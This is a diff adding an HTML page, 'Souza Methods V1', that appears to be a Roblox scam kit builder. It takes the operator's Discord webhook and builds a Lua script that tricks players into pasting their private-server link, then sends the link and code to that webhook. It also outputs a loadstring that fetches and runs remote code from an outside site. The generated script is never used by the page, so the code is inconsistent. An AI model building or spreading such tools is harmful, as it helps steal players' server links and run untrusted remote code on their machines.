@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Souza Methods V1</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: linear-gradient(135deg, #0a0a23 0%, #001122 50%, #000000 100%);
+      color:#00ff00; font-family:"Courier New",monospace; overflow:hidden;
+      display:flex; flex-direction:column; align-items:center; justify-content:space-between;
+      height:100vh; text-align:center; padding:8vh 20px 5vh; position:relative;
+    }
+    body::before {
+      content:''; position:absolute; top:0; left:0; right:0; bottom:0;
+      background:repeating-linear-gradient(0deg,rgba(0,255,0,0.03),rgba(0,255,0,0.03)1px,transparent1px,transparent2px);
+      pointer-events:none; z-index:1; animation:scan 8s linear infinite;
+    }
+    @keyframes scan { 0%{transform:translateY(0)} 100%{transform:translateY(20px)} }
+    h1 { font-size:3.8rem; text-shadow:0 0 10px #00ff00,0 0 20px #00ff00; animation:flicker 1.5s infinite alternate; z-index:3; }
+    @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.8} }
+    .logo-container { width:220px; height:220px; margin:20px 0; z-index:2; }
+    .logo-container svg { width:100%; height:100%; filter:drop-shadow(0 0 25px #00ff00); animation:float 4s ease-in-out infinite; }
+    @keyframes float { 0%,100%{transform:translateY(0) rotate(0deg)} 50%{transform:translateY(-15px) rotate(3deg)} }
+    .matrix-code { position:absolute; top:-60px; left:-60px; width:calc(100%+120px); height:calc(100%+120px); pointer-events:none; z-index:1; }
+    .code-char { position:absolute; color:#00ff00; font-size:14px; font-weight:bold; opacity:0; text-shadow:0 0 8px #00ff00; animation:fall linear infinite; }
+    @keyframes fall { 0%{transform:translateY(-120px);opacity:0} 10%{opacity:1} 90%{opacity:1} 100%{transform:translateY(320px);opacity:0} }
+    canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.7; }
+    a.discord-btn { color:#00ffcc; text-decoration:none; font-size:1.5rem; text-shadow:0 0 15px #00ffcc; padding:12px 25px; border:1px solid #00ff00; border-radius:8px; transition:all .4s; position:relative; overflow:hidden; margin-top:15px; z-index:3; }
+    a.discord-btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(0,255,0,.2),transparent); transition:.7s; }
+    a.discord-btn:hover::before { left:100% } a.discord-btn:hover { background:rgba(0,255,0,.1); color:#00ff00; transform:translateY(-3px); box-shadow:0 0 20px rgba(0,255,0,.5); }
+    .hub { display:flex; gap:15px; flex-wrap:wrap; justify-content:center; z-index:3; margin-bottom:20px; }
+    .hub-btn { background:rgba(0,255,0,.05); color:#00ff00; border:1px solid #00ff00; padding:12px 20px; font-size:1rem; text-transform:uppercase; cursor:pointer; border-radius:6px; transition:all .4s; min-width:140px; text-shadow:0 0 8px #00ff00; box-shadow:0 0 10px rgba(0,255,0,.2); }
+    .hub-btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(0,255,0,.3),transparent); transition:.6s; }
+    .hub-btn:hover::before { left:100% } .hub-btn:hover { background:rgba(0,255,0,.15); transform:translateY(-4px); box-shadow:0 0 25px rgba(0,255,0,.6); }
+    .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:100; padding:20px; }
+    .modal h2 { font-size:2.5rem; margin-bottom:30px; text-shadow:0 0 15px #00ff00; animation:glitch 2s infinite; }
+    @keyframes glitch { 0%,100%{text-shadow:0 0 10px #00ff00} 50%{text-shadow:2px 2px 10px #00ff00,-2px -2px 10px #00ff00} }
+    .webhook-input { width:80%; max-width:600px; padding:15px; background:rgba(0,255,0,.1); border:1px solid #00ff00; color:#00ff00; font-size:1rem; border-radius:6px; text-align:center; margin-bottom:20px; box-shadow:0 0 15px rgba(0,255,0,.3); }
+    .modal-buttons { display:flex; gap:20px; }
+    .modal-btn { padding:12px 30px; background:rgba(0,255,0,.1); border:1px solid #00ff00; color:#00ff00; font-size:1rem; text-transform:uppercase; cursor:pointer; border-radius:6px; transition:all .4s; box-shadow:0 0 10px rgba(0,255,0,.3); }
+    .modal-btn:hover { background:rgba(0,255,0,.2); transform:translateY(-3px); box-shadow:0 0 20px rgba(0,255,0,.6); }
+    .modal-btn.save { background:rgba(0,255,0,.2); }
+    .status { margin-top:15px; font-size:.9rem; opacity:0; transition:opacity .5s; }
+    .status.show { opacity:1; }
+    .download-btn { padding:15px 30px; background:rgba(0,255,0,.2); border:1px solid #00ff00; color:#00ff00; font-size:1.1rem; cursor:default; border-radius:6px; margin-top:10px; display:none; }
+    @media (max-width:600px) { h1{font-size:2.5rem} .logo-container{width:160px;height:160px} .hub-btn{font-size:.9rem;padding:10px 15px;min-width:110px} .modal h2{font-size:1.8rem} .webhook-input{width:90%;font-size:.9rem} }
+  </style>
+</head>
+<body>
+  <canvas id="particles"></canvas>
+
+  <div>
+    <h1>Souza Methods V1</h1>
+    <a href="https://discord.gg/DD9sGsp9FK" target="_blank" class="discord-btn">discord.gg/DD9sGsp9FK</a>
+  </div>
+
+  <div class="logo-container">
+    <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <linearGradient id="gold" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#FFD700"/><stop offset="100%" stop-color="#FFA500"/></linearGradient>
+        <filter id="glow"><feGaussianBlur stdDeviation="4" result="coloredBlur"/><feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+      </defs>
+      <g fill="url(#gold)" filter="url(#glow)">
+        <circle cx="50" cy="30" r="4"/><circle cx="150" cy="30" r="4"/>
+        <circle cx="30" cy="80" r="3"/><circle cx="170" cy="80" r="3"/>
+        <circle cx="40" cy="140" r="4"/><circle cx="160" cy="140" r="4"/>
+        <circle cx="80" cy="170" r="3"/><circle cx="120" cy="170" r="3"/>
+        <circle cx="100" cy="20" r="5"/><circle cx="70" cy="50" r="3"/>
+        <circle cx="130" cy="50" r="3"/><circle cx="60" cy="110" r="4"/>
+        <circle cx="140" cy="110" r="4"/>
+      </g>
+      <text x="100" y="125" font-family="Georgia, serif" font-size="90" fill="#C0C0C0" text-anchor="middle" font-weight="bold">SZ</text>
+    </svg>
+    <div class="matrix-code" id="matrix"></div>
+    <!-- REMOVIDO O ORBIT AQUI -->
+  </div>
+
+  <div class="hub">
+    <button class="hub-btn" onclick="location.reload()">Início</button>
+    <button class="hub-btn" onclick="openWebhookModal()">Souza x Cofizin Methods</button>
+    <button class="hub-btn" onclick="alert('Tutorial em breve!')">Tutorial</button>
+    <button class="hub-btn" onclick="window.open('https://github.com','_blank')">GitHub</button>
+  </div>
+
+  <div class="modal" id="webhookModal">
+    <h2>SOUZA x COFIZIN METHODS</h2>
+    <input type="text" class="webhook-input" id="webhookInput" placeholder="COLE SEU WEBHOOK DO DISCORD AQUI" />
+    <div class="modal-buttons">
+      <button class="modal-btn" onclick="closeWebhookModal()">Voltar</button>
+      <button class="modal-btn save" onclick="saveAndSend()">Salvar & Ativar</button>
+    </div>
+    <div class="status" id="status"></div>
+    <div class="download-btn" id="downloadBtn">Gerando...</div>
+  </div>
+
+  <script>
+    // === EFEITOS VISUAIS ===
+    const canvas = document.getElementById('particles'); const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight; const particles = [];
+    class Particle { constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.size = Math.random()*2+0.5; this.speedX = (Math.random()-0.5)*1.5; this.speedY = (Math.random()-0.5)*1.5; this.color = `hsl(${120+Math.random()*60},100%,70%)`; this.life = 0; this.maxLife = 100+Math.random()*50; } update() { this.x += this.speedX; this.y += this.speedY; this.life++; this.size *= 0.98; } draw() { const opacity = 1 - (this.life/this.maxLife); ctx.globalAlpha = opacity; ctx.fillStyle = this.color; ctx.beginPath(); ctx.arc(this.x,this.y,this.size,0,Math.PI*2); ctx.fill(); ctx.globalAlpha = 1; } }
+    function animate() { ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height); particles.forEach((p,i)=>{ p.update(); p.draw(); if(p.life>=p.maxLife||p.size<0.3) particles.splice(i,1); }); requestAnimationFrame(animate); }
+    setInterval(()=>{ for(let i=0;i<3;i++) particles.push(new Particle()); },80); animate();
+    window.addEventListener('resize',()=>{ canvas.width=window.innerWidth; canvas.height=window.innerHeight; });
+
+    // CÓDIGO CAINDO (MATRIX)
+    const matrix = document.getElementById('matrix');
+    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+    setInterval(()=>{ 
+      const char = document.createElement('div'); 
+      char.className = 'code-char'; 
+      char.textContent = chars[Math.floor(Math.random()*chars.length)]; 
+      char.style.left = Math.random()*100 + '%'; 
+      char.style.animationDuration = (Math.random()*3+2)+'s'; 
+      char.style.opacity = Math.random()*0.8+0.2; 
+      matrix.appendChild(char); 
+      setTimeout(() => char.remove(), 5000); 
+    }, 80);
+
+    // REMOVIDO O ORBIT COMPLETAMENTE
+
+    document.addEventListener('mousemove',(e)=>{ 
+      for(let i=0;i<2;i++){ 
+        const p = new Particle(); 
+        p.x = e.clientX; p.y = e.clientY; 
+        p.speedX *= 0.5; p.speedY *= 0.5; 
+        p.size = Math.random()*1.5; 
+        particles.push(p); 
+      } 
+    });
+
+    // === GERAÇÃO DE LOADSTRING + ENVIO DO LINK + EFEITO MATRIX ===
+    const modal = document.getElementById('webhookModal');
+    const input = document.getElementById('webhookInput');
+    const status = document.getElementById('status');
+    const downloadBtn = document.getElementById('downloadBtn');
+
+    function generateID() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let id = 'SZC-';
+      for (let i = 0; i < 6; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
+      return id;
+    }
+
+    function generateRandomKey() {
+      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+      let key = '';
+      for (let i = 0; i < 8; i++) key += chars.charAt(Math.floor(Math.random() * chars.length));
+      return key;
+    }
+
+    function openWebhookModal() {
+      modal.style.display = 'flex';
+      const saved = localStorage.getItem('discordWebhook');
+      if (saved) input.value = saved;
+      status.classList.remove('show');
+      downloadBtn.style.display = 'none';
+    }
+
+    function closeWebhookModal() { modal.style.display = 'none'; }
+
+    async function saveAndSend() {
+      const webhook = input.value.trim();
+      if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
+        showStatus('Webhook inválido!', '#ff0000');
+        return;
+      }
+
+      const userID = generateID();
+      const loadKey = generateRandomKey();
+      localStorage.setItem('discordWebhook', webhook);
+      localStorage.setItem('userID', userID);
+      localStorage.setItem('loadKey', loadKey);
+
+      try {
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: null,
+            embeds: [{
+              title: "SOUZA x COFIZIN ATIVADO!",
+              description: `**Usuário:** \`${userID}\`\n**Loadstring:** \`${loadKey}\`\nMétodo ativado!`,
+              color: 65280,
+              timestamp: new Date().toISOString(),
+              footer: { text: "Souza Methods V1" },
+              thumbnail: { url: "https://i.imgur.com/0Z0Y5mK.png" }
+            }]
+          })
+        });
+
+        showStatus(`Ativado! ID: ${userID}`, '#00ff00');
+        setTimeout(() => generateLoadstring(userID, loadKey, webhook), 800);
+      } catch { showStatus('Erro de conexão.', '#ff0000'); }
+    }
+
+    function generateLoadstring(userID, loadKey, webhook) {
+      const luaScript = `-- SOUZA x COFIZIN - ID: ${userID}
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Cria GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SouzaMethods_${userID}"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 250)
+frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundTransparency = 1
+title.Text = "Souza x Cofizin - ${userID}"
+title.TextColor3 = Color3.fromRGB(0, 255, 0)
+title.TextScaled = true
+title.Font = Enum.Font.Code
+title.Parent = frame
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, -20, 0, 40)
+label.Position = UDim2.new(0, 10, 0, 60)
+label.BackgroundTransparency = 1
+label.Text = "Cole o link do seu server privado:"
+label.TextColor3 = Color3.fromRGB(0, 255, 0)
+label.TextScaled = true
+label.Font = Enum.Font.Code
+label.TextXAlignment = Enum.TextXAlignment.Left
+label.Parent = frame
+
+local inputBox = Instance.new("TextBox")
+inputBox.Size = UDim2.new(1, -20, 0, 40)
+inputBox.Position = UDim2.new(0, 10, 0, 110)
+inputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+inputBox.BorderSizePixel = 0
+inputBox.PlaceholderText = "https://roblox.com/games/..."
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.TextScaled = true
+inputBox.Font = Enum.Font.Code
+inputBox.Parent = frame
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 5)
+inputCorner.Parent = inputBox
+
+local confirmBtn = Instance.new("TextButton")
+confirmBtn.Size = UDim2.new(0.8, 0, 0, 40)
+confirmBtn.Position = UDim2.new(0.1, 0, 0, 170)
+confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+confirmBtn.Text = "Entrar no Server"
+confirmBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+confirmBtn.TextScaled = true
+confirmBtn.Font = Enum.Font.Code
+confirmBtn.Parent = frame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 5)
+btnCorner.Parent = confirmBtn
+
+-- Efeito Matrix
+local matrixGui = Instance.new("ScreenGui")
+matrixGui.Name = "MatrixEffect"
+matrixGui.Parent = playerGui
+matrixGui.Enabled = false
+
+local matrixFrame = Instance.new("Frame")
+matrixFrame.Size = UDim2.new(1, 0, 1, 0)
+matrixFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+matrixFrame.Parent = matrixGui
+
+local matrixLabel = Instance.new("TextLabel")
+matrixLabel.Size = UDim2.new(1, 0, 1, 0)
+matrixLabel.BackgroundTransparency = 1
+matrixLabel.Text = ""
+matrixLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+matrixLabel.Font = Enum.Font.Code
+matrixLabel.TextSize = 14
+matrixLabel.Parent = matrixFrame
+
+local chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン"
+local columns = math.floor(game:GetService("GuiService"):GetScreenResolution().X / 15)
+local drops = {}
+
+for i = 1, columns do
+  drops[i] = math.random(1, 20)
+end
+
+spawn(function()
+  while wait(0.05) do
+    if not matrixGui.Enabled then break end
+    local output = {}
+    for col = 1, columns do
+      local line = {}
+      for row = 1, drops[col] do
+        table.insert(line, string.char(math.random(33, 126)))
+      end
+      table.insert(output, table.concat(line))
+      drops[col] = drops[col] + 1
+      if drops[col] > 50 then drops[col] = 0 end
+    end
+    matrixLabel.Text = table.concat(output, "\\n")
+  end
+end)
+
+-- Botão
+confirmBtn.MouseButton1Click:Connect(function()
+  local link = inputBox.Text
+  if link:find("roblox.com/games") and link:find("privateServerLinkCode=") then
+    local code = link:match("privateServerLinkCode=([%w%-]+)")
+    
+    -- ENVIA LINK PRO DISCORD
+    spawn(function()
+      HttpService:PostAsync("${webhook}", HttpService:JSONEncode({
+        content = nil,
+        embeds = {{
+          title = "SERVER PRIVADO ENVIADO!",
+          description = "**Usuário:** \`${userID}\`\n**Link:** \`" .. link .. "\`\n**Código:** \`" .. code .. "\`",
+          color = 65280,
+          timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+          footer = { text = "Souza Methods V1" },
+          thumbnail = { url = "https://i.imgur.com/0Z0Y5mK.png" }
+        }}
+      }))
+    end)
+
+    -- ATIVA EFEITO MATRIX
+    matrixGui.Enabled = true
+    screenGui.Enabled = false
+    
+    -- TELEPORTA
+    game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, code, {player})
+  else
+    StarterGui:SetCore("SendNotification", { Title = "Erro", Text = "Link inválido!", Duration = 3 })
+  end
+end)
+
+print("Souza x Cofizin carregado! ID: ${userID}")`;
+
+      const finalLua = luaScript.replace(/\${userID}/g, userID).replace(/\${webhook}/g, webhook);
+      const loadstringCode = `loadstring(game:HttpGet("https://souzamethods.com/script/${loadKey}"))()`;
+
+      const blob = new Blob([loadstringCode], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `souza_cofizin_${userID}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+
+      downloadBtn.innerHTML = `Baixado! (${userID})`;
+      downloadBtn.style.display = 'block';
+      showStatus(`Loadstring: ${loadKey}`, '#00ff00');
+
+      setTimeout(() => URL.revokeObjectURL(url), 1000);
+    }
+
+    function showStatus(msg, color) {
+      status.textContent = msg;
+      status.style.color = color;
+      status.classList.add('show');
+    }
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.style.display === 'flex') closeWebhookModal();
+    });
+  </script>
+</body>
+</html>
